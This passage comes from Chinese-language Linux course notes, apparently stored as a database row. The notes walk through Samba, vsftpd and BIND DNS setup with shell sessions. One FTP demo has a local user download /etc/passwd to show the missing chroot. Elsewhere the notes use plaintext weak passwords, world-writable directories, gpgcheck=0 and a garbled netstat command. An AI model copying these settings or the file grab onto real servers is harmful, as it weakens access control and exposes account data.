/etc/samba/smb.conf<span>&nbsp;</span></span><span><br></span><br><span>[global]<br>===Share Definitions=====<br>[smb1]<br>path = /share/smb1<br><br>[smb2]<br>path = /share/smb2<br>writable = yes<br></span><br>[root@station02 ~]#<span>&nbsp;</span><span>service smb start</span><br>启动 SMB 服务： [确定]<br>启动 NMB 服务： [确定]<br><br>========================================================================<br><br><span>建立samba用户：</span><span><br></span><br>[root@station02 ~]#<span>&nbsp;</span><span>useradd user1</span><br>[root@station02 ~]#<span>&nbsp;</span><span>smbpasswd -a user1</span><br><br>[root@station02 ~]# vim /etc/samba/smb.conf<span>&nbsp;</span><br><br><span>;[homes]	取消用户HOME共享<br>; comment = Home Directories<br>; browseable = no<br>; writable = yes<br>; valid users = %S<br>; valid users = MYDOMAIN\\%S<br></span><br>=========================================================================<br><br><span>从windows客户端测试</span><span><br></span><br><span>UNC: \\\\192.168.0.2</span><br><br>=========================================================================<br><br><span>samba共享级别<br></span><br>security=user | share | server | domain | ads<br><span>user级别:</span><span>&nbsp;</span>需要身份验证才可以看到共享列表<br><span>share级别:</span><span>&nbsp;</span>不需要身份验证就可以看到共享列表<br><br>=========================================================================<br><br><span>访问控制(基于用户)<br></span><br><span>[smb1]<br>path = /share/smb1<br>public = no<br>valid users = user2 user1	//有效用户，只读<br>write list = user1	//指定可写的用户<br><br>[smb2]<br>path = /share/smb2<br>public = yes<br>writable = yes	//所有合法的用户都可写<br></span><span><br></span><br>============================================================================<br><br><span>访问控制(基于属组)<br></span><br>it部门：alice,jack,robin,tom....<br>[root@station02 ~]#<span>&nbsp;</span><span>mkdir /share/it</span><br>[root@station02 ~]#<span>&nbsp;</span><span>groupadd it</span><br>[root@station02 ~<span>]#<span>&nbsp;</span></span><span>useradd alice1 -G it</span><span><br>[root@station02 ~]#<span>&nbsp;</span></span><span>useradd jack1 -G it</span><span><br>[root@station02 ~]#<span>&nbsp;</span></span><span>useradd robin1 -G it</span><span><br>[root@station02 ~]#<span>&nbsp;</span></span><span>chgrp it /share/it/</span><span><br>[root@station02 ~]#<span>&nbsp;</span></span><span>chmod 3770 /share/it/</span><span><br>[root@station02 ~]#<span>&nbsp;</span></span><span>ll -d /share/it/</span><br>drwxrws--T 2 root it 4096 10-03 00:06 /share/it/<br><br>[root@station02 ~]#<span>&nbsp;</span><span>vim /etc/samba/smb.conf<br></span><br><span>[it]<br>path = /share/it<br>valid users = +it<br>writable = yes<br></span><br>=============================================================================<br><br><span>访问控制(基于主机)<br><br></span>[root@station02 ~]#<span>&nbsp;</span><span>vim /etc/samba/smb.conf</span><span><br></span><br><span>[global]<br>; hosts allow = 127. 192.168.12. 192.168.13.	//整个服务器<br><br>[it]<br>path = /share/it<br>valid users = +it<br>write list = alice<br>hosts allow = 192.168.0.0/255.255.255.0	//仅针对该共享</span><br><br>==============================================================================<br><br><span>匿名用户登录：</span><br><br><span>smbclient -L //192.168.0.1</span>	询共享信息<br><span>smbclient //192.168.0.1/smb1</span>	登录smb服务器<br><span>mount -t cifs //192.168.0.1/smb /mnt</span><br><br>=================================================================================<br><br><span>授权用户登录：</span><br><br><span>useradd robin</span><br><span>smbpasswd -a robin</span><br><span>pdbedit -L</span><span>&nbsp;</span>查询所有的smb用户<br>用户文件<span>/etc/samba/passdb.tdb</span><br><br>[root@station02 ~]#<span>&nbsp;</span><span>smbclient -U robin%123 //192.168.0.1/smb</span><br>[root@station02 ~]#<span>&nbsp;</span><span>mount -t cifs -o user=robin,password=123 //192.168.0.1/smb /mnt</span><br><br>===============================================================================<br><br><span>练习:<br></span><br>销售部能在文件服务器最多存放5G文件<br>人力资源部能使用文件服务器2G<br>IT部门无限制<br>g+s 保障用户创建的文件自动继承属组<br><br>==================================================================================<br><br><span>从Linux客户端使用CIFS访问samba或windows共享<br></span><br>[root@station40 ~]#<span>&nbsp;</span><span>yum -y install samba-client<br><br>访问linux主机共享：<br>================<br></span><br>[root@station40 ~]#<span>&nbsp;</span><span>smbclient -L 192.168.0.2 -U jack1<br></span><br>Password:<span>&nbsp;</span><br>Domain=[STATION02] OS=[Unix] Server=[Samba 3.0.33-3.37.el5]<br><br>Sharename Type Comment<br>--------- ---- -------<br>IPC$ IPC IPC Service (Samba Server Version 3.0.33-3.37.el5)<br>it Disk<span>&nbsp;</span><br>smb2 Disk<span>&nbsp;</span><br>smb1 Disk<span>&nbsp;</span><br>Domain=[STATION02] OS=[Unix] Server=[Samba 3.0.33-3.37.el5]<br><br>Server Comment<br>--------- -------<br><br>Workgroup Master<br>--------- -------<br>MYGROUP LOCALHOST52<br><br>[root@station40 ~]#<span>&nbsp;</span><span>mount //192.168.0.2/it /mnt -o username=jack1</span><br>Password:<span>&nbsp;</span><br>[root@station40 ~]#<span>&nbsp;</span><span>df -Th</span><br>文件系统 类型 容量 已用 可用 已用% 挂载点<br>/dev/sda1 ext3 29G 14G 13G 52% /<br>/dev/sda6 ext3 19G 3.3G 15G 19% /usr<br>/dev/sda5 ext3 19G 5.7G 13G 32% /var<br>/dev/sda3 ext3 19G 173M 18G 1% /usr/local<br>/dev/sda2 ext3 19G 173M 18G 1% /home<br>tmpfs tmpfs 997M 0 997M 0% /dev/shm<br>//192.168.0.2/it<br>cifs 18G 2.8G 15G 16% /mnt<br><br>[root@station40 ~]#<span>&nbsp;</span><span>mount //192.168.0.2/it /mnt -o username=jack1%1</span><br><br><span>访问windows主机共享：<br>==================<br></span><br>[root@station40 ~]#<span>&nbsp;</span><span>smbclient -L 192.168.0.26 -U administrator</span>	//windows主机<br>Password:<span>&nbsp;</span><br>Domain=[PC3052-20121002] OS=[Windows 5.1] Server=[Windows 2000 LAN Manager]<br><br>Sharename Type Comment<br>--------- ---- -------<br>yyy Disk<span>&nbsp;</span><br>IPC$ IPC 远程 IPC<br>session request to 192.168.0.26 failed (Called name not present)<br>session request to 192 failed (Called name not present)<br>Domain=[PC3052-20121002] OS=[Windows 5.1] Server=[Windows 2000 LAN Manager]<br><br>Server Comment<br>--------- -------<br><br>Workgroup Master<br>--------- -------<br><br>[root@station40 ~]#<span>&nbsp;</span><span>mount //192.168.0.26/yyy /mnt -o username=administrator%1</span><br>[root@station40 ~]#<span>&nbsp;</span><span>ls /mnt/</span><br>Word 2003.lnk<br><br>=======================================================================================<br><br><span>开机自动挂载/etc/fstab<br></span><br><span>//192.168.0.26/yyy /mnt cifs username=administrator%1 0 0</span><br><br>=======================================================================================<br><br><br><span style=\"font-weight: 700;\">FTP</span><br></dd><dd><span>FTP Server</span><span><br><br></span>===================================================================<span><br></span><br>FTP	<span>文件传输协议</span><br>软件包	<span>vsftpd<br></span>安装<span>	yum -y install ftp lftp<br></span><br>ftp端口:<span>&nbsp;</span><span>控制端口</span><span>&nbsp;</span>21/tcp 消息端口<br><span>数据端口</span><span>&nbsp;</span>20/tcp<br><br>配置文件：<span>&nbsp;</span><span>/etc/vsftpd/vsftpd.conf</span><br><br>[root@station02 ~]#<span>&nbsp;</span><span>egrep -v \'^#|^$\' /etc/vsftpd/vsftpd.conf<span>&nbsp;</span><br></span><br><span>anonymous_enable=YES<br>local_enable=YES<br>write_enable=YES<br>local_umask=022<br>dirmessage_enable=YES<br>xferlog_enable=YES<br>connect_from_port_20=YES<br>xferlog_std_format=YES<br>listen=YES<br>pam_service_name=vsftpd<br>userlist_enable=YES<br>tcp_wrappers=YES</span><br><br>===================================================================<br><br><span>vsftpd支持的用户类型：<br></span><br><span>匿名用户 ftp,anonymous	<br>本地用户 alice,jack</span><br><span>虚拟用户 不存在系统账号数据库中（第三方的数据库mysql），安全</span><br><br><span>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin<br>alice:x:500:500::/home/alice:/bin/bash<br></span><br>注：本地用户是不需要有shell(nologin shell)<br><br><br><br><dl><dt>匿名用户访问</dt><dd><span>使用匿名用户访问<br><br></span><span>=========================================================<br><br></span><span>ftp命令登录<br></span><br>[root@station40 ~]#<span>&nbsp;</span><span>ftp 192.168.0.2<br></span><br>Connected to 192.168.0.2.<br>220 (vsFTPd 2.0.5)<br>530 Please login with USER and PASS.<br>530 Please login with USER and PASS.<br>KERBEROS_V4 rejected as an authentication type<br>Name (192.168.0.2:root):<span>&nbsp;</span><span>ftp</span><br>331 Please specify the password.<br>Password:<br>230 Login successful.<br>Remote system type is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt;<span>&nbsp;</span><span>ls</span><br>227 Entering Passive Mode (192,168,0,2,181,141)<br>150 Here comes the directory listing.<br>drwxr-xr-x 2 0 0 4096 Dec 05 2011 pub<br>226 Directory send OK.<br>ftp&gt;<span>&nbsp;</span><span>pwd</span><br>257 \"/\"	//已经被chroot(/var/ftp)<br>ftp&gt;<span>&nbsp;</span><span>ls</span><br>227 Entering Passive Mode (192,168,0,2,207,100)<br>150 Here comes the directory listing.<br>drwxr-xr-x 2 0 0 4096 Dec 05 2011 pub<br>226 Directory send OK.<br>ftp&gt;<span>&nbsp;</span><span>cd /etc</span><br>550 Failed to change directory.<br><br>===========================================================<br><br><span>lftp命令登录</span><br><br>[root@station40 ~]#<span>&nbsp;</span><span>lftp 192.168.0.2</span><br>lftp 192.168.0.2:~&gt;<span>&nbsp;</span><span>ls</span><br>drwxr-xr-x 2 0 0 4096 Dec 05 2011 pub<br>lftp 192.168.0.2:/&gt;<span><span>&nbsp;</span>put /etc/services<span>&nbsp;</span></span><br>put: Access failed: 550 Permission denied. (services)<span>&nbsp;</span><br>ftp&gt;<span>&nbsp;</span><span>bye</span><br><br>===========================================================<br><br><span>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin<br>匿名用户登录时默认映射的本地ftp用户<br>默认配置文件支持anonymous用户只能下载位于chroot目录/var/ftp的内容，且不能到其他目录下</span><br><br><br><br><span style=\"font-weight: 700;\">本地用户访问</span><br></dd><dd><span>使用本地用户访问<br><br></span>====================================================================<span><br><br>ftp命令登录<br></span><br>[root@station40 ~]#<span>&nbsp;</span><span>ftp 192.168.0.2</span><br>Connected to 192.168.0.2.<br>220 (vsFTPd 2.0.5)<br>530 Please login with USER and PASS.<br>530 Please login with USER and PASS.<br>KERBEROS_V4 rejected as an authentication type<br>Name (192.168.0.2:root):<span>&nbsp;</span><span>alice</span><br>331 Please specify the password.<br>Password:<br>230 Login successful.<br>Remote system type is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt;<span>&nbsp;</span><span>ls</span><br>227 Entering Passive Mode (192,168,0,2,60,52)<br>150 Here comes the directory listing.<br>226 Directory send OK.<br>ftp&gt;<span><span>&nbsp;</span>pwd</span><br>257 \"/home/alice\"<br>ftp&gt;<span>&nbsp;</span><br>ftp&gt; cd /home<br>250 Directory successfully changed.<br>ftp&gt;<span>&nbsp;</span><span>ls</span><br>227 Entering Passive Mode (192,168,0,2,90,112)<br>150 Here comes the directory listing.<br>drwx------ 3 500 500 4096 Oct 02 2012 alice<br>drwx------ 3 2003 2004 4096 Oct 02 2012 alice1<br>drwx------ 3 2004 2005 4096 Oct 02 2012 jack1<br>drwx------ 3 2005 2006 4096 Oct 02 2012 robin1<br>drwx------ 3 2000 2000 4096 Oct 02 2012 tom<br>drwx------ 3 2001 2001 4096 Oct 02 2012 user1<br>drwx------ 3 2002 2002 4096 Oct 02 2012 user2<br>226 Directory send OK.<br>ftp&gt;<span>&nbsp;</span><span>cd /etc</span><br>ftp&gt;<span>&nbsp;</span><span>get passwd</span><br>local: passwd remote: passwd<br>227 Entering Passive Mode (192,168,0,2,64,26)<br>150 Opening BINARY mode data connection for passwd (1890 bytes).<br>226 File send OK.<br>1890 bytes received in 0.00018 seconds (1e+04 Kbytes/s)<br><br>=====================================================================<br><br><span>lftp命令登录</span><br><br>[root@station40 ~]#<span>&nbsp;</span><span>lftp alice@192.168.0.2</span><br>口令:<span>&nbsp;</span><br>lftp alice@192.168.0.2:~&gt;<span>&nbsp;</span><span>pwd<span>&nbsp;</span></span><br>ftp://alice@192.168.0.2<br>lftp alice@192.168.0.2:~&gt;<span>&nbsp;</span><span>ls</span><br>lftp alice@192.168.0.2:~&gt;<span>&nbsp;</span><span>put /etc/services<span>&nbsp;</span></span><br>362031 bytes transferred<span>&nbsp;</span><br>lftp alice@192.168.0.2:~&gt;<span>&nbsp;</span><span>ls</span><br>-rw-r--r-- 1 500 500 362031 Sep 27 12:34 services<br>lftp alice@192.168.0.2:~&gt;<span>&nbsp;</span><span>cd /tmp/</span><br>lftp alice@192.168.0.2:/tmp&gt;<span><span>&nbsp;</span>put /etc/hosts</span><br>58 bytes transferred<span>&nbsp;</span><br><br>======================================================================<br><br><span>windwos端登录<br></span><br>browser:<br><span>ftp://192.168.0.2<br>ftp://alice@192.168.0.2<br>ftp://alice:1@192.168.0.2</span><br><br>======================================================================<br><br><span>alice:x:500:500::/home/alice:/bin/bash<br>所有用户默认访问的是他们的HOME<br>ftp允许系统用户使用密码进行访问，支持下载系统上他们可以读取的任何文件<br>并可以将文件上传到系统上（他们可以写入的任何位置），缺省没有chroot</span><br><br><br><br><span style=\"font-weight: 700;\">虚拟用户访问</span><br></dd><dd><span>虚拟用户<br><br></span>===============================================================================<span><br></span><br><span>1.建立用户数据库</span><span><br></span><br><span>cat ftpuser.txt</span><br>test111 # 账户<br>pass111 # 密码<br>test222<br>pass222<br><br><span>yum -y install db4-utils<br>rpm -qf $(which db_load)</span><br>db4-utils-4.3.29-9.fc6<br><br><span>db_load -T -t hash -f ~/ftpuser.txt /etc/vsftpd/vsftpd_login.db</span><br><br>===============================================================================<br><br><span>2.建立验证模式文件</span><br><span><br>mv /etc/pam.d/vsftpd /etc/pam.d/vsftpd.bak</span><br><span>vim /etc/pam.d/vsftpd<br></span><br><span>auth required /lib/security/pam_userdb.so db=/etc/vsftpd/vsftpd_login<br>account required /lib/security/pam_userdb.so db=/etc/vsftpd/vsftpd_login</span><br><br>==============================================================================<br><br><span>3.建立一个所有虚拟用户使用的系统用户<br></span><br><span>useradd -d /home/vsftp virtual</span><br><span>chmod 755 /home/vsftp<br><br></span>===============================================================================<br><br><span>4.修改配置文件启用虚拟用户<br></span><br><span>vim /etc/vsftpd/vsftpd.conf</span><span><br></span><br><span>guest_enable=YES	#开启虚拟用户功能<br>guest_username=virtual	#指定虚拟用户使用的系统用户<br>pam_service_name=vsftpd #以/etc/pam.d/验证模式文件名相同</span><br><br>==============================================================================<br><br><span>5.重新启动后可以用虚拟用户登陆了.<br><br></span><span>service vsftpd restart</span><span><br><br></span>===============================================================================<br><span><br>为虚拟用户设置不同权限</span><br><br><span>vim /etc/vsftpd/vsftpd.conf<br></span><br>virtual_use_local_privs<br><br><span>设置为YES 时，虚拟用户使用与本地用户相同权限，设置为NO 时，虚拟用户使用与匿<br>名用户相同权限<br><br>=================================================================================<br><br></span><span>为用户设置私有参数<br></span><br><span>1.添加per_user 功能参数,如果开启了此功能,必须为每一个用户都有配置文件</span><br><br>vim /etc/vsftpd/vsftpd.conf<br><br><span>user_config_dir=/etc/vsftpd/vsftp_user_conf</span><br><br><span>2.在/etc/vsftpd/vsftp_user_conf 这个目录下建立与虚拟用户同名的文件,文件中写入用户的私有参数</span><br><br>echo \"write_enable=NO\" &gt; /etc/vsftpd/vsftp_user_conf/test111<br>我们限制test111 禁止上传文件<br><br><span>3.重启动 vsftpd 登录测试.</span><br></dd><dt>使用FTP搭建yum库</dt><dd><span>FTP搭建yum库<br></span><br>[root@station40 ~]#<span>&nbsp;</span><span>ls /var/ftp/pub/rhel5.8/</span>	//整个系统光盘的文件<br>[root@station40 ~]#<span>&nbsp;</span><span>lftp 192.168.0.40</span><br>lftp 192.168.0.40:~&gt;<span>&nbsp;</span><span>ls</span><br>drwxr-xr-x 8 0 0 4096 Oct 03 16:04 pub<br>lftp 192.168.0.40:/&gt;<span>&nbsp;</span><span>by</span><br>[root@station40 ~]#<span>&nbsp;</span><span>cat /etc/yum.repos.d/rhel-debuginfo.repo<span>&nbsp;</span><br></span><br><span>[Server]<br>name=Server<br>baseurl=ftp://192.168.0.40/pub/rhel5.8/Server<br>enabled=1<br>gpgcheck=0<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release<br></span></dd><dt>FTP访问控制</dt><dd><span>访问控制<br></span><br>[root@station02 ~]#<span>&nbsp;</span><span>vim /etc/vsftpd/vsftpd.conf<br></span><br><span>anonymous_enable=YES	//是否允许匿名用户登录<br>local_enable=YES	//是否允许本地用户登录<br>write_enable=YES	//是否允许写（全局）<br>local_umask=022	//控制本地用户上传文件的默认权限<br>anon_umask	//控制匿名用户上传文件的默认权限，默认为077，如果想让匿名用户上传的文件能够被下载，需要<br>更改匿名用户umask<br><br>chroot_local_user=YES	//chroot本地用户的HOME<br>anon_max_rate=500000	//匿名用户最的下载速率，单位byte<br>local_max_rate	//本地用户最大下载速率<br>max_per_ip=2	//单个IP最大的连接，即下载的线程数	<br>max_clients=500	//ftp最大连接数据</span><br><br>[root@station02 ~]#<span>&nbsp;</span><span>egrep -v \'^#|^$\' /etc/vsftpd/vsftpd.conf &gt; vsftpd.conf</span><br>[root@station02 ~]#<span>&nbsp;</span><span>cp -rf vsftpd.conf /etc/vsftpd/vsftpd.conf<span>&nbsp;</span></span><br>cp：是否覆盖“/etc/vsftpd/vsftpd.conf”? y<br><br>[root@station02 ~]#<span>&nbsp;</span><span>rsync -a 192.168.0.52:/etc/vsftpd/vsftpd.conf /etc/vsftpd/</span><br><span>vim /etc/vsftpd/vsftpd.conf</span><br><br><span>user_config_dir=/etc/vsftpd/vsftpd_users //启用私有配置文件功能并指定目录<br>anon_root	//匿名用户访问的家目录，默认为/var/ftp,目录权限必须为755<br>local_root=/	//改变本地用户访问的主目录</span><br><br>================================================================================================<br><br><span>实验：建立公司内部ftp服务器，并进行相应访问控制<br></span><br><span>一、准备工作<br></span><br><span>a. 建立相应目录结构</span><br>[root@station02 ~]#<span>&nbsp;</span><span>mkdir -p /var/global/{it,sale/sa1,sale/sa2,hr}</span><br>[root@station02 ~]#<span>&nbsp;</span><span>tree /var/global/</span><br>/var/global/<br>|-- hr<br>|-- it<br>`-- sale<br>|-- sa1<br>`-- sa2<br><br>5 directories, 0 files<br>[root@station02 ~]#<span>&nbsp;</span><span>chmod -R 777 /var/global/</span><br><br><span>b. 准备相应的用户</span><br>[root@station02 ~]#<span>&nbsp;</span><span>useradd admin -s /sbin/nologin<span>&nbsp;</span></span><br>[root@station02 ~]#<span>&nbsp;</span><span>useradd it_admin -s /sbin/nologin<span>&nbsp;</span></span><br>[root@station02 ~]#<span>&nbsp;</span><span>useradd sale_admin -s /sbin/nologin<span>&nbsp;</span></span><br>[root@station02 ~]#<span>&nbsp;</span><span>useradd hr_admin -s /sbin/nologin<span>&nbsp;</span></span><br>[root@station02 ~]#<span>&nbsp;</span><span>useradd sa1_admin -s /sbin/nologin<span>&nbsp;</span></span><br>[root@station02 ~]#<span>&nbsp;</span><span>useradd sa2_admin -s /sbin/nologin<span>&nbsp;</span></span><br><br>[root@station02 ~]#<span>&nbsp;</span><span>for i in admin it_admin sale_admin sa1_admin sa2_admin hr_admin<br>&gt; do<br>&gt; echo 1 |passwd --stdin $i<br>&gt; done<br><br></span><br><span>二、配置vsftpd<br></span><br><span>a. 主配置文件（严格）</span><span><br></span><br><span>anonymous_enable=NO<br>write_enable=NO<br>chroot_local_user=YES<br>user_config_dir=/etc/vsftpd/vsftpd_users<br></span><br>[root@station02 ~]#<span>&nbsp;</span><span>mkdir /etc/vsftpd/vsftpd_users</span><br>[root@station02 ~]#<span>&nbsp;</span><span>service vsftpd restart</span><br><br><span>b. 私有配置文件<br></span><br>[root@station02 vsftpd_users]#<span>&nbsp;</span><span>cat /etc/vsftpd/vsftpd_users/admin<span>&nbsp;</span><br></span><br><span>write_enable=YES<br>local_root=/var/global</span><br><br>[root@station02 vsftpd_users]#<span>&nbsp;</span><span>cat /etc/vsftpd/vsftpd_users/it_admin<span>&nbsp;</span><br></span><br><span>write_enable=YES<br>local_root=/var/global/it</span><br><br>[root@station02 vsftpd_users]#<span>&nbsp;</span><span>cat hr_admin<span>&nbsp;</span><br></span><br><span>write_enable=YES<br>local_root=/var/global/hr<br>local_max_rate=200000<br>max_per_ip=2<br></span><br>=================================================================================<br><br><span>匿名用户上传<br></span><br>[root@station02 ~]#<span>&nbsp;</span><span>mkdir /var/ftp/upload</span><br>[root@station02 ~]#<span>&nbsp;</span><span>chmod 777 /var/ftp/upload/</span><br><br><span>vim /etc/vsftpd/vsftpd.conf</span><br><br><span>anon_upload_enable=YES<br>anon_mkdir_write_enable=YES</span><br><br><span>如果要求匿名用户上传的文件能够被下载，还需要修改匿名用户的的umask<br></span><br><span>anon_umask＝022	默认为077</span></dd></dl></dd></dl><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/centos.jpg','centos:latest','2016-10-13 11:21:02',1,NULL,'',0,''),(75,'linux基础课程训练十四','linuxDNS方面的命令操作','<p>说明：我虚拟环境使用的是centos,可以通过&nbsp;cat&nbsp;/etc/issue来查看，如果发现测试的命令找不到\r\n</p><p>可以使用yum&nbsp;install&nbsp;-y&nbsp;命令&nbsp;先插入这个命令再去运行试一试。比如man命令可能运行不了。yum&nbsp;install&nbsp;-y&nbsp;man&nbsp;之后就可以正常使用了。</p><p>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</p><dt>概念</dt><dd><br>DNS服务器<br><br>邮件系统需要DNS支持<br>SSL需要DNS支持	https://www.taobao.com<br>虚拟主机（Apache,Nginx）需要DNS支持<br>安全认证(kerberos)需要DNS支持<br>CDN需要DNS支持<br><br>名称服务器(名字服务器)<br>long long ago:用hosts文件做解析<br>later:用DNS域名系统，域名服务 Domain Name Service<br><br>name space 命名空间，简单讲就是如何给互联网上的主机起名的<br>DNS数据库是一个层次化、分布式的数据库<br><br>===============================================================================<br><br>非权威/递归名称服务器:<br><br>并不存储某个区域的实际数据<br>Caching only: 仅缓存名称服务器 虽然可以提供查询，但查询内容不具有权威性<br><br>================================================================================<br><br>权威名称服务器：<br><br>存储并提供某个区域的实际数据，比如126.com域的DNS服务器，它记录了126.com域中所有主机的记录，例如：<br><br>www.126.com.	x.x.x.x<br>mail.126.com.	y.y.y.y<br><br>权威名称服务器类型包括：<br>Mastr: 主要名称服务器，包含原始区域的数据<br>Slave: 备份名称服务器，通过区域传送从Master服务器获得区域数据的副本。也叫‘次要‘名称服务器<br><br>=================================================================================</dd><dt>DNS查询过程</dt><dd>DNS查询过程 www.126.com.<br><br>1. 客户端上解析器将查询发送到/etc/resolv.conf中的名称服务器<br>2. 如果名称服务器对于请求的信息具有权威性，会将（权威答案）发送到客户端<br>3. 否则，如果名称服务器在其缓存中有请求的信息，则会将（非权威答案）发送至客户<br>4. 如果缓存中没有信息，名称服务器将搜索权威名称服务器以查找信息：<br>从根区域开始，按照DNS层次结构向下搜索，直至对于信息具有权威的名称服务器，以此为客户端获得答案。<br>名称服务器将信息传递给客户端 并在自己的缓存中保留一个副本，以备以后查找<br></dd><dt>DNS Server安装与配置文件</dt><dd>DNS Server 安装与配置文件<br><br>软件包：bind,bind-chroot(安全),caching-nameserver(模板文件)<br>服务端口：53/tcp 53/udp<br>配置文件：/var/named/chroot/etc/named.conf 主配置文件（建立区域uplook.com）<br>/var/named/chroot/var/named/* 数据库文件 (主机名和IP的对应关系)<br>/var/named/chroot 虚拟根目录<br><br>[root@station02 ~]#&nbsp;yum -y install bind bind-chroot caching-nameserver<br>[root@station02 ~]#&nbsp;cd /var/named/chroot/<br>[root@station02 chroot]#&nbsp;ls<br>dev etc var<br>[root@station02 chroot]#&nbsp;cd etc<br>[root@station02 etc]#&nbsp;pwd<br>/var/named/chroot/etc<br>[root@station02 etc]#&nbsp;ll<br>总计 16<br>-rw-r--r-- 1 root root 405 09-22 17:23 localtime<br>-rw-r----- 1 root named 1230 2011-12-02 named.caching-nameserver.conf<br>-rw-r----- 1 root named 955 2011-12-02 named.rfc1912.zones<br>-rw-r----- 1 root named 113 09-28 01:42 rndc.key<br><br>[root@station02 etc]#&nbsp;mv named.caching-nameserver.conf named.conf<br></dd><dt>权威DNS服务器</dt><dd><dl><dt>正向区</dt><dd><br>正向区-提供将主机名或域名解析成IP（常用）<br><br>==========================================================================<br><br>示例一：<br><br>建立uplookin.com<br><br>[root@station02 ~]#&nbsp;vim /var/named/chroot/etc/named.conf<br><br><br>options {<br>directory \"/var/named\";<br>dump-file \"/var/named/data/cache_dump.db\";<br>statistics-file \"/var/named/data/named_stats.txt\";<br>memstatistics-file \"/var/named/data/named_mem_stats.txt\";<br>};<br><br>zone \"uplooking.com\" {	//建立uplooking.com正向区<br>type master;	//类型：uplooking.com主DNS服务器<br>file \"uplooking.com.zone\";	//指定该区域的数据库文件及位置<br>};<br><br><br>[root@station02 ~]#&nbsp;vim /var/named/chroot/var/named/uplooking.com.zone<br><br><br>$TTL 7200<br>uplooking.com.	IN	SOA dns.uplooking.com. root.uplooking.com. (<br>2012092000<br>1H<br>15M<br>1W<br>1D )<br>uplooking.com. IN	NS dns.uplooking.com.<br>dns.uplooking.com. IN A 192.168.0.2<br>www.uplooking.com. IN A 192.168.0.15<br><br><br>资源记录类型<br>SOA	起始授权记录<br>NS	Name Server名称服务器<br>A	主机记录<br>CNAME 别名记录<br>PTR 反向指针记录（反向区）<br>MX 邮件交换器记录<br><br>注意事项：区域文件中（数据库文件）<br>www.uplooking.com. = www<br>@表示当前域名<br>留空表示向上继承<br><br>[root@station02 ~]#&nbsp;service named start<br>启动 named： [确定]<br>[root@station02 ~]#&nbsp;chkconfig named on<br>[root@station02 ~]#&nbsp;ps aux | grep named<br>named 28579 0.0 1.2 38828 3180 ? Ssl 02:06 0:00 /usr/sbin/named -u named -t /var/named/chroot<br>root 28591 0.0 0.2 5128 672 pts/0 R+ 02:07 0:00 grep named<br><br>[root@station02 ~]#&nbsp;ne2012092000tstat -tunl | grep :53<br>tcp 0 0 192.168.0.2:53 0.0.0.0:* LISTEN&nbsp;<br>tcp 0 0 127.0.0.1:53 0.0.0.0:* LISTEN&nbsp;<br>udp 0 0 192.168.0.2:53 0.0.0.0:*&nbsp;<br>udp 0 0 127.0.0.1:53 0.0.0.0:*&nbsp;<br>udp 0 0 0.0.0.0:5353 0.0.0.0:*&nbsp;<br><br>=============================================================================================<br><br>示例二：<br><br>建立126.com<br><br>[root@station02 ~]#&nbsp;vim /var/named/chroot/etc/named.conf<br><br><br>zone \"126.com\" {<br>type master;<br>file \"126.com.zone\";<br>};<br><br><br>[root@station02 ~]#&nbsp;vim /var/named/chroot/var/named/126.com.zone<br><br><br>$TTL 3600<br>@ IN SOA ns.126.com. root (<br>2012092000<br>1H<br>15M<br>1W<br>1D )&nbsp;<br>IN NS ns<br>dns IN A 192.168.0.2<br>www IN A 192.168.0.200<br><br><br>[root@station02 ~]#&nbsp;rndc reload<br>server reload successful<br><br>[root@station02 ~]#&nbsp;vim /var/named/chroot/var/named/126.com.zone<br><br><br>zone \".\" {<br>type hint;	//建立根提示区域，让DNS服务器能找到根<br>file \"named.ca\";	//named.ca，包含的是全世界13台根服务器的地址<br>};<br><br>[root@station02 ~]#&nbsp;ls /var/named/chroot/var/named/<br>data named.broadcast named.local summer.com.zone<br>localdomain.zone named.ca named.zero<br>localhost.zone named.ip6.local slaves<br><br>软件包caching-nameser提供named.ca<br><br>===============================================================================================<br><br><br><br><span style=\"font-weight: 700;\">反向区</span><br></dd><dd><br>反向区-提供将IP解析为主机名或域名<br><br>=====================================================================<br><br>配置过程<br><br>[root@station02 ~]#&nbsp;vim /var/named/chroot/etc/named.conf<br><br>zone \"0.168.192.in-addr.arpa\" {<br>type master;<br>file \"192.168.0.zone\";<br>};<br><br>[root@station02 ~]#&nbsp;cd /var/named/chroot/var/named/<br>[root@station02 named]#&nbsp;cp 126.com.zone 192.168.0.zone<br>[root@station02 named]#&nbsp;vim 192.168.0.zone<br><br>$TTL 3600<br>@ IN SOA ns.126.com. root.126.com. (<br>2012092000<br>1H<br>15M<br>1W<br>1D )<br>IN NS ns.126.com.<br>2 IN PTR ns.126.com.<br>200 IN PTR www.126.com.<br><br>小提示：<br>反向区和正向区一一对应（在正向区中所有A记录必须有对应的PTR反向指针记录）<br>反向区中的主机名必须写全<br><br>[root@station02 named]#&nbsp;rndc reload<br>server reload successful<br><br>========================================================================<br><br>从客户端测试<br><br>Linux:<br>=====<br><br>[root@station40 ~]#&nbsp;cat /etc/resolv.conf&nbsp;<br>nameserver 192.168.0.2	//指向DNS Server<br><br>[root@station40 ~]#&nbsp;host www.uplooking.com<br>www.uplooking.com has address 192.168.0.15<br><br>[root@station40 ~]#&nbsp;ping www.uplooking.com<br>PING www.uplooking.com (192.168.0.15) 56(84) bytes of data.<br>64 bytes from 192.168.0.15: icmp_seq=1 ttl=64 time=1.08 ms<br>64 bytes from 192.168.0.15: icmp_seq=2 ttl=64 time=0.159 ms<br><br>[root@station40 ~]#&nbsp;host www.126.com<br>www.126.com has address 192.168.0.200<br><br>[root@station40 ~]#&nbsp;host 192.168.0.200<br>200.0.168.192.in-addr.arpa domain name pointer www.126.com.<br><br><br>Windows:<br>========<br><br>ipconfig /displaydns	//查询DNS Cache(最近查询,hosts)<br>ipconfig /flushdns<br><br>$TTL 7200<br>@ IN SOA dns.uplooking.com. root (<br>2012092100<br>1H<br>15M<br>1W<br>1D )<br>IN NS dns<br>IN MX 10 mail<br>dns IN A 192.168.0.2<br>www IN A 192.168.0.15<br>oa IN A 192.168.0.20<br>ftp IN A 192.168.0.21<br>mail IN A 192.168.0.220<br><br>[root@station40 ~]#&nbsp;host www.uplooking.com<br>www.uplooking.com has address 192.168.0.15<br><br>[root@station40 ~]#&nbsp;host 192.168.0.15<br>15.0.168.192.in-addr.arpa domain name pointer 